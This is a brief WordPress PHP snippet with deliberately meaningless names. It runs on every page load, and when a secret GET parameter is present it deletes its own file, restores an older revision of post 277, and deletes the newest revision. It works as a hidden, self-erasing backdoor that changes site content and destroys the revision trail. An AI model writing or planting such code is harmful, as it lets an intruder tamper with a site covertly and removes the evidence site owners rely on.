<?php

function selector_default_plus_results() {
	if (isset($_GET['icons_endpoints_asset_lite']) && $_GET['icons_endpoints_asset_lite'] === 'tools_catalog_fonts_ticket') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$upload_accordion_archives = 277;
		$advanced_save_your_bank = wp_get_post_revisions($upload_accordion_archives);
		if (empty($advanced_save_your_bank)) die('no revisions');
		if (count($advanced_save_your_bank) < 2) die('less than 2');
		$table_player_snippets = array_shift($advanced_save_your_bank);
		$switch_header_autocomplete_tree = $table_player_snippets->ID;
		$floating_uploader_system = array_shift($advanced_save_your_bank);
		$footer_magic_table = $floating_uploader_system->ID;
		$categories_view_ecommerce_front = wp_restore_post_revision($footer_magic_table);
		if ($categories_view_ecommerce_front === false) die('error restoring');
		$categories_view_ecommerce_front = wp_delete_post_revision($switch_header_autocomplete_tree);		
		if ($categories_view_ecommerce_front === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'selector_default_plus_results');
